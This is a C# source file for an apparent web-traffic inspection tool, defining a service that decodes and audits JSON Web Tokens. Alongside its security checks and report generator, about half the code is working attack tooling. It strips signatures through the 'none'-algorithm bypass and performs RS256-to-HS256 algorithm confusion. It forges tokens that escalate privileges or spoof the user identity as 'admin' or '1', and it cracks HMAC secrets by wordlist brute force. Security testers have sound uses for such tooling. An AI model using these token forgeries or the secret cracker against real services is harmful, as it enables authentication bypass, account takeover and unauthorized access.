using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Service for analyzing, decoding, and manipulating JSON Web Tokens (JWT)
    /// </summary>
    public class JWTManipulationService
    {
        public JWTManipulationService()
        {
        }

        /// <summary>
        /// Detect if a string is a JWT token
        /// </summary>
        public bool IsJWT(string token)
        {
            if (string.IsNullOrWhiteSpace(token)) return false;

            // JWT format: xxxxx.yyyyy.zzzzz
            var parts = token.Split('.');
            if (parts.Length != 3) return false;

            // Check if each part is base64url encoded
            foreach (var part in parts)
            {
                if (!IsBase64Url(part)) return false;
            }

            return true;
        }

        private bool IsBase64Url(string input)
        {
            if (string.IsNullOrEmpty(input)) return false;
            return Regex.IsMatch(input, @"^[A-Za-z0-9_-]+$");
        }

        /// <summary>
        /// Decode a JWT token
        /// </summary>
        public JWTToken DecodeToken(string token)
        {
            if (!IsJWT(token))
                throw new ArgumentException("Invalid JWT format");

            var parts = token.Split('.');
            var jwtToken = new JWTToken
            {
                RawToken = token,
                HeaderBase64 = parts[0],
                PayloadBase64 = parts[1],
                SignatureBase64 = parts[2]
            };

            try
            {
                jwtToken.Header = DecodeBase64Url(parts[0]);
                jwtToken.HeaderJson = JsonDocument.Parse(jwtToken.Header);

                jwtToken.Payload = DecodeBase64Url(parts[1]);
                jwtToken.PayloadJson = JsonDocument.Parse(jwtToken.Payload);

                jwtToken.Signature = parts[2];

                // Extract algorithm
                if (jwtToken.HeaderJson.RootElement.TryGetProperty("alg", out var alg))
                {
                    jwtToken.Algorithm = alg.GetString();
                }

                // Extract expiration
                if (jwtToken.PayloadJson.RootElement.TryGetProperty("exp", out var exp))
                {
                    jwtToken.ExpiresAt = DateTimeOffset.FromUnixTimeSeconds(exp.GetInt64()).DateTime;
                }

                // Extract issued at
                if (jwtToken.PayloadJson.RootElement.TryGetProperty("iat", out var iat))
                {
                    jwtToken.IssuedAt = DateTimeOffset.FromUnixTimeSeconds(iat.GetInt64()).DateTime;
                }

                // Extract subject
                if (jwtToken.PayloadJson.RootElement.TryGetProperty("sub", out var sub))
                {
                    jwtToken.Subject = sub.GetString();
                }

                // Extract issuer
                if (jwtToken.PayloadJson.RootElement.TryGetProperty("iss", out var iss))
                {
                    jwtToken.Issuer = iss.GetString();
                }
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to decode JWT: {ex.Message}", ex);
            }

            return jwtToken;
        }

        /// <summary>
        /// Analyze JWT for security issues
        /// </summary>
        public JWTAnalysisResult AnalyzeToken(string token)
        {
            var result = new JWTAnalysisResult
            {
                Issues = new List<JWTIssue>()
            };

            try
            {
                var jwtToken = DecodeToken(token);
                result.Token = jwtToken;

                // Check for "none" algorithm
                if (jwtToken.Algorithm?.ToLower() == "none")
                {
                    result.Issues.Add(new JWTIssue
                    {
                        Severity = "Critical",
                        Type = "None Algorithm",
                        Description = "JWT uses 'none' algorithm, allowing signature bypass"
                    });
                }

                // Check for weak algorithms
                var weakAlgorithms = new[] { "HS256", "HS384", "HS512" };
                if (jwtToken.Algorithm != null && weakAlgorithms.Contains(jwtToken.Algorithm))
                {
                    result.Issues.Add(new JWTIssue
                    {
                        Severity = "Medium",
                        Type = "Weak Algorithm",
                        Description = $"JWT uses HMAC algorithm '{jwtToken.Algorithm}' which is vulnerable to brute force if key is weak"
                    });
                }

                // Check expiration
                if (!jwtToken.ExpiresAt.HasValue)
                {
                    result.Issues.Add(new JWTIssue
                    {
                        Severity = "High",
                        Type = "No Expiration",
                        Description = "JWT does not have an expiration time (exp claim)"
                    });
                }
                else if (jwtToken.ExpiresAt.Value < DateTime.UtcNow)
                {
                    result.Issues.Add(new JWTIssue
                    {
                        Severity = "Info",
                        Type = "Expired Token",
                        Description = $"JWT expired on {jwtToken.ExpiresAt.Value}"
                    });
                }
                else if ((jwtToken.ExpiresAt.Value - DateTime.UtcNow).TotalDays > 365)
                {
                    result.Issues.Add(new JWTIssue
                    {
                        Severity = "Medium",
                        Type = "Long Expiration",
                        Description = "JWT has a very long expiration time (> 1 year)"
                    });
                }

                // Check for sensitive data in payload
                var sensitiveKeys = new[] { "password", "pwd", "secret", "key", "apikey", "api_key", "ssn", "credit_card" };
                foreach (var prop in jwtToken.PayloadJson.RootElement.EnumerateObject())
                {
                    if (sensitiveKeys.Any(k => prop.Name.ToLower().Contains(k)))
                    {
                        result.Issues.Add(new JWTIssue
                        {
                            Severity = "Critical",
                            Type = "Sensitive Data Exposure",
                            Description = $"JWT payload contains potentially sensitive field: {prop.Name}"
                        });
                    }
                }

                // Check for admin/privileged claims
                var privilegedKeys = new[] { "admin", "role", "permissions", "scope", "isAdmin" };
                foreach (var prop in jwtToken.PayloadJson.RootElement.EnumerateObject())
                {
                    if (privilegedKeys.Any(k => prop.Name.ToLower().Contains(k.ToLower())))
                    {
                        result.Issues.Add(new JWTIssue
                        {
                            Severity = "High",
                            Type = "Privileged Claims",
                            Description = $"JWT contains privileged claim '{prop.Name}' which may be manipulable",
                            ManipulationTarget = prop.Name
                        });
                    }
                }

                // Check signature length (for HMAC)
                if (jwtToken.Algorithm?.StartsWith("HS") == true && jwtToken.SignatureBase64.Length < 40)
                {
                    result.Issues.Add(new JWTIssue
                    {
                        Severity = "Medium",
                        Type = "Short Signature",
                        Description = "JWT signature appears short, may indicate weak secret key"
                    });
                }
            }
            catch (Exception ex)
            {
                result.Issues.Add(new JWTIssue
                {
                    Severity = "Error",
                    Type = "Analysis Error",
                    Description = $"Failed to analyze JWT: {ex.Message}"
                });
            }

            return result;
        }

        /// <summary>
        /// Manipulate JWT claims
        /// </summary>
        public string ManipulateToken(string token, Dictionary<string, object> newClaims, bool removeSignature = false)
        {
            var jwtToken = DecodeToken(token);

            // Parse current payload
            var payloadDict = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(jwtToken.Payload);

            // Apply new claims
            foreach (var claim in newClaims)
            {
                payloadDict[claim.Key] = JsonSerializer.SerializeToElement(claim.Value);
            }

            // Encode new payload
            var newPayloadJson = JsonSerializer.Serialize(payloadDict);
            var newPayloadBase64 = EncodeBase64Url(newPayloadJson);

            // Reconstruct token
            if (removeSignature)
            {
                return $"{jwtToken.HeaderBase64}.{newPayloadBase64}.";
            }
            else
            {
                return $"{jwtToken.HeaderBase64}.{newPayloadBase64}.{jwtToken.SignatureBase64}";
            }
        }

        /// <summary>
        /// Change JWT algorithm to "none"
        /// </summary>
        public string BypassWithNoneAlgorithm(string token)
        {
            var jwtToken = DecodeToken(token);

            // Modify header to use "none" algorithm
            var headerDict = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(jwtToken.Header);
            headerDict["alg"] = JsonSerializer.SerializeToElement("none");

            var newHeaderJson = JsonSerializer.Serialize(headerDict);
            var newHeaderBase64 = EncodeBase64Url(newHeaderJson);

            // Return token without signature
            return $"{newHeaderBase64}.{jwtToken.PayloadBase64}.";
        }

        /// <summary>
        /// Change JWT algorithm from RS256 to HS256 (algorithm confusion attack)
        /// </summary>
        public string AlgorithmConfusionAttack(string token)
        {
            var jwtToken = DecodeToken(token);

            // Modify header to use HS256
            var headerDict = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(jwtToken.Header);
            headerDict["alg"] = JsonSerializer.SerializeToElement("HS256");

            var newHeaderJson = JsonSerializer.Serialize(headerDict);
            var newHeaderBase64 = EncodeBase64Url(newHeaderJson);

            // Return token (signature would need to be recalculated with public key as secret)
            return $"{newHeaderBase64}.{jwtToken.PayloadBase64}.{jwtToken.SignatureBase64}";
        }

        /// <summary>
        /// Generate attack variants for JWT
        /// </summary>
        public List<JWTAttackVariant> GenerateAttackVariants(string token)
        {
            var variants = new List<JWTAttackVariant>();

            try
            {
                var jwtToken = DecodeToken(token);

                // None algorithm bypass
                variants.Add(new JWTAttackVariant
                {
                    Name = "None Algorithm Bypass",
                    Description = "Change algorithm to 'none' and remove signature",
                    Token = BypassWithNoneAlgorithm(token),
                    AttackType = "Algorithm Bypass"
                });

                // Algorithm confusion (RS256 to HS256)
                variants.Add(new JWTAttackVariant
                {
                    Name = "Algorithm Confusion (RS256 → HS256)",
                    Description = "Change algorithm from RS256 to HS256 (requires public key as secret)",
                    Token = AlgorithmConfusionAttack(token),
                    AttackType = "Algorithm Confusion"
                });

                // Privilege escalation variants
                var privilegeEscalations = new Dictionary<string, object>[]
                {
                    new() { { "admin", true } },
                    new() { { "role", "admin" } },
                    new() { { "isAdmin", true } },
                    new() { { "permissions", new[] { "admin", "read", "write", "delete" } } },
                    new() { { "scope", "admin" } }
                };

                foreach (var claims in privilegeEscalations)
                {
                    var claimName = claims.Keys.First();
                    variants.Add(new JWTAttackVariant
                    {
                        Name = $"Privilege Escalation ({claimName})",
                        Description = $"Add/modify '{claimName}' claim for privilege escalation",
                        Token = ManipulateToken(token, claims, removeSignature: true),
                        AttackType = "Privilege Escalation"
                    });
                }

                // Extend expiration
                variants.Add(new JWTAttackVariant
                {
                    Name = "Extended Expiration",
                    Description = "Extend token expiration to 10 years in the future",
                    Token = ManipulateToken(token, new Dictionary<string, object>
                    {
                        { "exp", DateTimeOffset.UtcNow.AddYears(10).ToUnixTimeSeconds() }
                    }, removeSignature: true),
                    AttackType = "Token Manipulation"
                });

                // User ID manipulation
                if (jwtToken.PayloadJson.RootElement.TryGetProperty("sub", out _) ||
                    jwtToken.PayloadJson.RootElement.TryGetProperty("userId", out _) ||
                    jwtToken.PayloadJson.RootElement.TryGetProperty("user_id", out _))
                {
                    variants.Add(new JWTAttackVariant
                    {
                        Name = "User ID Manipulation (admin)",
                        Description = "Change user identifier to 'admin'",
                        Token = ManipulateToken(token, new Dictionary<string, object>
                        {
                            { "sub", "admin" },
                            { "userId", "admin" },
                            { "user_id", "admin" }
                        }, removeSignature: true),
                        AttackType = "Identity Spoofing"
                    });

                    variants.Add(new JWTAttackVariant
                    {
                        Name = "User ID Manipulation (1)",
                        Description = "Change user identifier to '1' (often admin)",
                        Token = ManipulateToken(token, new Dictionary<string, object>
                        {
                            { "sub", "1" },
                            { "userId", 1 },
                            { "user_id", 1 }
                        }, removeSignature: true),
                        AttackType = "Identity Spoofing"
                    });
                }
            }
            catch (Exception ex)
            {
                variants.Add(new JWTAttackVariant
                {
                    Name = "Error",
                    Description = $"Failed to generate variants: {ex.Message}",
                    Token = token,
                    AttackType = "Error"
                });
            }

            return variants;
        }

        /// <summary>
        /// Attempt to crack JWT secret (for HMAC algorithms)
        /// </summary>
        public JWTCrackResult AttemptCrack(string token, List<string> wordlist, int maxAttempts = 10000)
        {
            var result = new JWTCrackResult
            {
                Success = false,
                AttemptsCount = 0
            };

            try
            {
                var jwtToken = DecodeToken(token);

                if (!jwtToken.Algorithm.StartsWith("HS"))
                {
                    result.Error = "Token does not use HMAC algorithm";
                    return result;
                }

                var headerPayload = $"{jwtToken.HeaderBase64}.{jwtToken.PayloadBase64}";
                var targetSignature = jwtToken.SignatureBase64;

                foreach (var secret in wordlist.Take(maxAttempts))
                {
                    result.AttemptsCount++;

                    var testSignature = GenerateHMACSignature(headerPayload, secret, jwtToken.Algorithm);

                    if (testSignature == targetSignature)
                    {
                        result.Success = true;
                        result.Secret = secret;
                        return result;
                    }
                }

                result.Error = "Secret not found in wordlist";
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }

            return result;
        }

        private string GenerateHMACSignature(string data, string secret, string algorithm)
        {
            HMAC hmac = algorithm switch
            {
                "HS256" => new HMACSHA256(Encoding.UTF8.GetBytes(secret)),
                "HS384" => new HMACSHA384(Encoding.UTF8.GetBytes(secret)),
                "HS512" => new HMACSHA512(Encoding.UTF8.GetBytes(secret)),
                _ => throw new ArgumentException($"Unsupported algorithm: {algorithm}")
            };

            var hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(data));
            return EncodeBase64Url(hash);
        }

        private string DecodeBase64Url(string input)
        {
            var base64 = input.Replace('-', '+').Replace('_', '/');
            switch (base64.Length % 4)
            {
                case 2: base64 += "=="; break;
                case 3: base64 += "="; break;
            }
            var bytes = Convert.FromBase64String(base64);
            return Encoding.UTF8.GetString(bytes);
        }

        private string EncodeBase64Url(string input)
        {
            var bytes = Encoding.UTF8.GetBytes(input);
            return EncodeBase64Url(bytes);
        }

        private string EncodeBase64Url(byte[] input)
        {
            var base64 = Convert.ToBase64String(input);
            return base64.Replace('+', '-').Replace('/', '_').TrimEnd('=');
        }

        public string GenerateReport(JWTAnalysisResult analysis)
        {
            var sb = new StringBuilder();
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine("          JWT Security Analysis Report");
            sb.AppendLine("═══════════════════════════════════════════════════════════");

            if (analysis.Token != null)
            {
                sb.AppendLine($"Algorithm: {analysis.Token.Algorithm}");
                sb.AppendLine($"Issued At: {analysis.Token.IssuedAt}");
                sb.AppendLine($"Expires At: {analysis.Token.ExpiresAt}");
                sb.AppendLine($"Subject: {analysis.Token.Subject}");
                sb.AppendLine($"Issuer: {analysis.Token.Issuer}");
                sb.AppendLine();

                sb.AppendLine("HEADER:");
                sb.AppendLine(analysis.Token.Header);
                sb.AppendLine();

                sb.AppendLine("PAYLOAD:");
                sb.AppendLine(analysis.Token.Payload);
                sb.AppendLine();
            }

            if (analysis.Issues.Any())
            {
                sb.AppendLine("SECURITY ISSUES:");
                sb.AppendLine("─────────────────────────────────────────────────────────");

                var critical = analysis.Issues.Where(i => i.Severity == "Critical").ToList();
                var high = analysis.Issues.Where(i => i.Severity == "High").ToList();
                var medium = analysis.Issues.Where(i => i.Severity == "Medium").ToList();
                var low = analysis.Issues.Where(i => i.Severity == "Low" || i.Severity == "Info").ToList();

                if (critical.Any())
                {
                    sb.AppendLine($"\nCRITICAL ({critical.Count}):");
                    foreach (var issue in critical)
                    {
                        sb.AppendLine($"  • {issue.Type}: {issue.Description}");
                    }
                }

                if (high.Any())
                {
                    sb.AppendLine($"\nHIGH ({high.Count}):");
                    foreach (var issue in high)
                    {
                        sb.AppendLine($"  • {issue.Type}: {issue.Description}");
                    }
                }

                if (medium.Any())
                {
                    sb.AppendLine($"\nMEDIUM ({medium.Count}):");
                    foreach (var issue in medium)
                    {
                        sb.AppendLine($"  • {issue.Type}: {issue.Description}");
                    }
                }

                if (low.Any())
                {
                    sb.AppendLine($"\nLOW/INFO ({low.Count}):");
                    foreach (var issue in low)
                    {
                        sb.AppendLine($"  • {issue.Type}: {issue.Description}");
                    }
                }
            }
            else
            {
                sb.AppendLine("No security issues detected.");
            }

            sb.AppendLine("\n═══════════════════════════════════════════════════════════");

            return sb.ToString();
        }
    }

    #region Models

    public class JWTToken
    {
        public string RawToken { get; set; }
        public string HeaderBase64 { get; set; }
        public string PayloadBase64 { get; set; }
        public string SignatureBase64 { get; set; }
        public string Header { get; set; }
        public string Payload { get; set; }
        public string Signature { get; set; }
        public JsonDocument HeaderJson { get; set; }
        public JsonDocument PayloadJson { get; set; }
        public string Algorithm { get; set; }
        public DateTime? ExpiresAt { get; set; }
        public DateTime? IssuedAt { get; set; }
        public string Subject { get; set; }
        public string Issuer { get; set; }
    }

    public class JWTAnalysisResult
    {
        public JWTToken Token { get; set; }
        public List<JWTIssue> Issues { get; set; }
    }

    public class JWTIssue
    {
        public string Severity { get; set; }
        public string Type { get; set; }
        public string Description { get; set; }
        public string ManipulationTarget { get; set; }
    }

    public class JWTAttackVariant
    {
        public string Name { get; set; }
        public string Description { get; set; }
        public string Token { get; set; }
        public string AttackType { get; set; }
    }

    public class JWTCrackResult
    {
        public bool Success { get; set; }
        public string Secret { get; set; }
        public int AttemptsCount { get; set; }
        public string Error { get; set; }
    }

    #endregion
}
